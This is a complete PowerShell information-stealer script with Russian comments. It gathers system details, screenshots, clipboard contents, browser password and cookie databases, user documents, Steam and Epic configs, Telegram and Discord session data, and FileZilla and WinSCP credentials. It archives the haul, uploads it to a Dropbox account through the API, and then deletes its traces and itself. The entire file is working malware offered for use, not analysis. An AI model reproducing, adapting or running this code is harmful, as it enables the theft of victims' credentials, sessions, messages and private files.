# --- Настройки Dropbox ---
$DropboxAccessToken = "YOUR_DROPBOX_ACCESS_TOKEN_HERE"  # Получите токен на https://www.dropbox.com/developers/apps
$MaxPartSize = 50MB  # Размер части для Dropbox (можно загружать файлы до 150MB через обычный API)

# --- Настройки сбора данных ---
$StealBrowserData      = $true
$StealFiles            = $true
$StealSystemInfo       = $true
$StealGamingSessions   = $true
$StealMessengerLogs    = $true
$StealSessionsAndTokens= $true
$TakeScreenshot        = $true
$GrabClipboard         = $true
$StealVpnFtp           = $true

# --- Настройки очистки ---
$SelfDelete = $true

$OutputMessages = @{
    Start        = "Запуск профессионального модуля сбора данных..."
    SystemInfo   = "[+] Сбор информации о системе и сети..."
    BrowserSearch= "[+] Поиск установленных браузеров..."
    BrowserData  = "[+] Извлечение файлов сессий, паролей и cookies..."
    Files        = "[+] Поиск и копирование файлов (doc, txt, xls)..."
    Gaming       = "[+] Поиск данных игровых клиентов (Steam, Epic Games)..."
    Messengers   = "[+] Сбор логов мессенджеров (Telegram, Discord)..."
    Tokens       = "[+] Поиск токенов авторизации..."
    Screenshot   = "[+] Создание скриншота экрана..."
    Clipboard    = "[+] Копирование данных из буфера обмена..."
    VpnFtp       = "[+] Поиск конфигураций VPN, FTP (FileZilla, WinSCP)..."
    Archiving    = "[+] Архивирование данных..."
    Sending      = "[+] Отправка архива в Dropbox..."
    Cleaning     = "[+] Очистка следов..."
    Complete     = "Процесс завершен."
}

function Start-Stealer {
    $LogFolder = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss')"
    if (-not (Test-Path $LogFolder)) {
        New-Item -Path $LogFolder -ItemType Directory -Force | Out-Null
    }

    Write-Host $OutputMessages.Start -ForegroundColor Yellow

    try {
        if ($StealSystemInfo) {
            Write-Host $OutputMessages.SystemInfo -ForegroundColor Cyan
            Get-SystemInformation -LogPath $LogFolder
        }
        if ($TakeScreenshot) {
            Write-Host $OutputMessages.Screenshot -ForegroundColor Cyan
            Get-Screenshot -LogPath $LogFolder
        }
        if ($GrabClipboard) {
            Write-Host $OutputMessages.Clipboard -ForegroundColor Cyan
            Get-ClipboardData -LogPath $LogFolder
        }
        if ($StealBrowserData) {
            Write-Host $OutputMessages.BrowserSearch -ForegroundColor Cyan
            $BrowserProfiles = Find-AllBrowserProfiles
            if ($null -ne $BrowserProfiles) {
                Write-Host $OutputMessages.BrowserData -ForegroundColor Cyan
                Get-BrowserFiles -BrowserProfiles $BrowserProfiles -LogPath "$LogFolder\BrowserData"
            }
        }
        if ($StealFiles) {
            Write-Host $OutputMessages.Files -ForegroundColor Cyan
            Copy-UserFiles -LogPath "$LogFolder\Files"
        }
        if ($StealGamingSessions) {
            Write-Host $OutputMessages.Gaming -ForegroundColor Cyan
            Get-GamingData -LogPath "$LogFolder\Gaming"
        }
        if ($StealMessengerLogs) {
            Write-Host $OutputMessages.Messengers -ForegroundColor Cyan
            Get-MessengerData -LogPath "$LogFolder\Messengers"
        }
        if ($StealSessionsAndTokens) {
            Write-Host $OutputMessages.Tokens -ForegroundColor Cyan
            Get-Tokens -LogPath "$LogFolder\Tokens" -BrowserProfiles $BrowserProfiles
        }
        if ($StealVpnFtp) {
            Write-Host $OutputMessages.VpnFtp -ForegroundColor Cyan
            Get-VpnFtpData -LogPath "$LogFolder\VpnFtp"
        }

        $ZipPath = "$env:TEMP\Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
        Write-Host $OutputMessages.Archiving -ForegroundColor Yellow
        
        # Используем .NET для архивирования с быстрым сжатием
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($LogFolder, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)

        Write-Host $OutputMessages.Sending -ForegroundColor Yellow
        $size = (Get-Item $ZipPath).Length
        
        if ($size -ge $MaxPartSize) {
            # Разделяем на части
            $parts = Split-File -FilePath $ZipPath -MaxBytes $MaxPartSize
            $i = 1
            foreach ($partFile in $parts) {
                $remotePath = "/Logs/Log_part_$i`_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
                Send-DropboxFile -SourceFilePath $partFile -TargetFilePath $remotePath
                Remove-Item $partFile -Force -ErrorAction SilentlyContinue
                $i++
            }
        } else {
            # Загружаем целиком
            $remotePath = "/Logs/Log_$(Get-Date -Format 'yyyy-MM-dd_HH-mm-ss').zip"
            Send-DropboxFile -SourceFilePath $ZipPath -TargetFilePath $remotePath
        }
    }
    catch {
        Write-Host "Произошла ошибка: $($_.Exception.Message)" -ForegroundColor Red
    }
    finally {
        Write-Host $OutputMessages.Cleaning -ForegroundColor Yellow
        Remove-Item -Path $LogFolder -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path $ZipPath -Force -ErrorAction SilentlyContinue
        if ($SelfDelete) {
            $scriptPath = $MyInvocation.MyCommand.Path
            if ($scriptPath -and (Test-Path $scriptPath)) {
                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
            }
        }
        Write-Host $OutputMessages.Complete -ForegroundColor Green
    }
}

# --- Отправка файла в Dropbox через REST API ---
function Send-DropboxFile {
    param(
        [Parameter(Mandatory=$true)]
        [string]$SourceFilePath,
        [Parameter(Mandatory=$true)]
        [string]$TargetFilePath
    )
    
    try {
        $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
        $authorization = "Bearer " + $DropboxAccessToken
        
        $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
        $headers.Add("Authorization", $authorization)
        $headers.Add("Dropbox-API-Arg", $arg)
        $headers.Add("Content-Type", 'application/octet-stream')
        
        Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers | Out-Null
        
        Write-Host "Файл успешно загружен: $TargetFilePath" -ForegroundColor Green
    }
    catch {
        Write-Warning "Failed to send file to Dropbox: $($_.Exception.Message)"
    }
}

# --- Разделение файла на части ---
function Split-File {
    param (
        [string]$FilePath,
        [int64]$MaxBytes = $MaxPartSize
    )
    $buffsize = 8MB
    $filename = [System.IO.Path]::GetFileNameWithoutExtension($FilePath)
    $ext = [System.IO.Path]::GetExtension($FilePath)
    $files = @()
    $fs = [System.IO.File]::OpenRead($FilePath)
    $part = 1

    try {
        while ($fs.Position -lt $fs.Length) {
            $target = "$($FilePath)_part$part$ext"
            $partStream = [System.IO.File]::Create($target)
            $written = 0
            while (($written -lt $MaxBytes) -and ($fs.Position -lt $fs.Length)) {
                $toRead = [Math]::Min([Math]::Min($buffsize, ($MaxBytes - $written)), ($fs.Length - $fs.Position))
                $buffer = New-Object byte[] $toRead
                $read = $fs.Read($buffer, 0, $toRead)
                if ($read -gt 0) { $partStream.Write($buffer, 0, $read); $written += $read }
                else { break }
            }
            $partStream.Close()
            $files += $target
            $part++
        }
    } finally { $fs.Close() }
    return $files
}

# --- Сбор информации о системе ---
function Get-SystemInformation {
    param($LogPath)
    $sysInfoPath = "$LogPath\SystemInfo.txt"
    
    $info = @"
=== Информация о системе ===
Имя компьютера: $env:COMPUTERNAME
Имя пользователя: $env:USERNAME
Домен: $env:USERDOMAIN
ОС: $(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Caption)
Версия ОС: $(Get-CimInstance Win32_OperatingSystem | Select-Object -ExpandProperty Version)
Архитектура: $env:PROCESSOR_ARCHITECTURE
Процессор: $(Get-CimInstance Win32_Processor | Select-Object -ExpandProperty Name)
ОЗУ: $([Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)) GB
Дата/время: $(Get-Date)

=== Сетевая информация ===
"@
    
    $info | Out-File -FilePath $sysInfoPath -Encoding UTF8
    
    # IP адреса
    $ipInfo = Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'} | 
        Select-Object IPAddress, InterfaceAlias | Out-String
    Add-Content -Path $sysInfoPath -Value $ipInfo
    
    # DNS
    try {
        $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5)
        Add-Content -Path $sysInfoPath -Value "`nВнешний IP: $publicIP"
    } catch {}
}

# --- Создание скриншота ---
function Get-Screenshot {
    param($LogPath)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
        
        $screenshotPath = "$LogPath\Screenshot.png"
        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
        
        $graphics.Dispose()
        $bitmap.Dispose()
    } catch {}
}

# --- Копирование данных из буфера обмена ---
function Get-ClipboardData {
    param($LogPath)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $clipboardText = [System.Windows.Forms.Clipboard]::GetText()
        if ($clipboardText) {
            $clipboardPath = "$LogPath\Clipboard.txt"
            $clipboardText | Out-File -FilePath $clipboardPath -Encoding UTF8
        }
    } catch {}
}

# --- Поиск профилей браузеров ---
function Find-AllBrowserProfiles {
    $profiles = @()
    
    # Chrome
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
    if (Test-Path $chromePath) {
        $profiles += @{Browser='Chrome'; Path=$chromePath}
    }
    
    # Edge
    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
    if (Test-Path $edgePath) {
        $profiles += @{Browser='Edge'; Path=$edgePath}
    }
    
    # Firefox
    $firefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
    if (Test-Path $firefoxPath) {
        $profiles += @{Browser='Firefox'; Path=$firefoxPath}
    }
    
    # Opera
    $operaPath = "$env:APPDATA\Opera Software\Opera Stable"
    if (Test-Path $operaPath) {
        $profiles += @{Browser='Opera'; Path=$operaPath}
    }
    
    # Brave
    $bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
    if (Test-Path $bravePath) {
        $profiles += @{Browser='Brave'; Path=$bravePath}
    }
    
    return $profiles
}

# --- Извлечение файлов браузеров ---
function Get-BrowserFiles {
    param($BrowserProfiles, $LogPath)
    
    if (-not (Test-Path $LogPath)) {
        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    }
    
    foreach ($profile in $BrowserProfiles) {
        $browserName = $profile.Browser
        $browserPath = $profile.Path
        $targetPath = "$LogPath\$browserName"
        
        if (-not (Test-Path $targetPath)) {
            New-Item -Path $targetPath -ItemType Directory -Force | Out-Null
        }
        
        # Копируем важные файлы
        $filesToCopy = @('Login Data', 'Cookies', 'Web Data', 'History', 'Bookmarks', 'key4.db', 'logins.json', 'cookies.sqlite')
        
        foreach ($file in $filesToCopy) {
            $searchPath = Get-ChildItem -Path $browserPath -Filter $file -Recurse -ErrorAction SilentlyContinue
            foreach ($foundFile in $searchPath) {
                try {
                    Copy-Item -Path $foundFile.FullName -Destination "$targetPath\$($foundFile.Name)" -Force -ErrorAction SilentlyContinue
                } catch {}
            }
        }
    }
}

# --- Копирование пользовательских файлов ---
function Copy-UserFiles {
    param($LogPath)
    
    if (-not (Test-Path $LogPath)) {
        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    }
    
    $extensions = @('*.txt', '*.doc', '*.docx', '*.xls', '*.xlsx', '*.pdf')
    $searchPaths = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
    
    foreach ($searchPath in $searchPaths) {
        if (Test-Path $searchPath) {
            foreach ($ext in $extensions) {
                Get-ChildItem -Path $searchPath -Filter $ext -ErrorAction SilentlyContinue | 
                    ForEach-Object {
                        try {
                            Copy-Item -Path $_.FullName -Destination "$LogPath\$($_.Name)" -Force -ErrorAction SilentlyContinue
                        } catch {}
                    }
            }
        }
    }
}

# --- Сбор данных игровых клиентов ---
function Get-GamingData {
    param($LogPath)
    
    if (-not (Test-Path $LogPath)) {
        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    }
    
    # Steam
    $steamPath = "$env:PROGRAMFILES(x86)\Steam\config"
    if (Test-Path $steamPath) {
        Copy-Item -Path "$steamPath\*" -Destination "$LogPath\Steam" -Recurse -Force -ErrorAction SilentlyContinue
    }
    
    # Epic Games
    $epicPath = "$env:LOCALAPPDATA\EpicGamesLauncher\Saved\Config"
    if (Test-Path $epicPath) {
        Copy-Item -Path "$epicPath\*" -Destination "$LogPath\Epic" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# --- Сбор данных мессенджеров ---
function Get-MessengerData {
    param($LogPath)
    
    if (-not (Test-Path $LogPath)) {
        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    }
    
    # Telegram
    $telegramPath = "$env:APPDATA\Telegram Desktop\tdata"
    if (Test-Path $telegramPath) {
        Copy-Item -Path "$telegramPath\*" -Destination "$LogPath\Telegram" -Recurse -Force -ErrorAction SilentlyContinue
    }
    
    # Discord
    $discordPath = "$env:APPDATA\discord\Local Storage\leveldb"
    if (Test-Path $discordPath) {
        Copy-Item -Path "$discordPath\*" -Destination "$LogPath\Discord" -Recurse -Force -ErrorAction SilentlyContinue
    }
}

# --- Поиск токенов ---
function Get-Tokens {
    param($LogPath, $BrowserProfiles)
    
    if (-not (Test-Path $LogPath)) {
        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    }
    
    # Собираем из браузеров (уже скопировано в BrowserFiles)
    # Дополнительно ищем в других местах
}

# --- Сбор VPN/FTP конфигураций ---
function Get-VpnFtpData {
    param($LogPath)
    
    if (-not (Test-Path $LogPath)) {
        New-Item -Path $LogPath -ItemType Directory -Force | Out-Null
    }
    
    # FileZilla
    $filezillaPath = "$env:APPDATA\FileZilla"
    if (Test-Path $filezillaPath) {
        Copy-Item -Path "$filezillaPath\*" -Destination "$LogPath\FileZilla" -Recurse -Force -ErrorAction SilentlyContinue
    }
    
    # WinSCP
    $winscpPath = "$env:APPDATA\WinSCP.ini"
    if (Test-Path $winscpPath) {
        Copy-Item -Path $winscpPath -Destination "$LogPath\WinSCP.ini" -Force -ErrorAction SilentlyContinue
    }
}

# --- Запуск основной функции ---
Start-Stealer
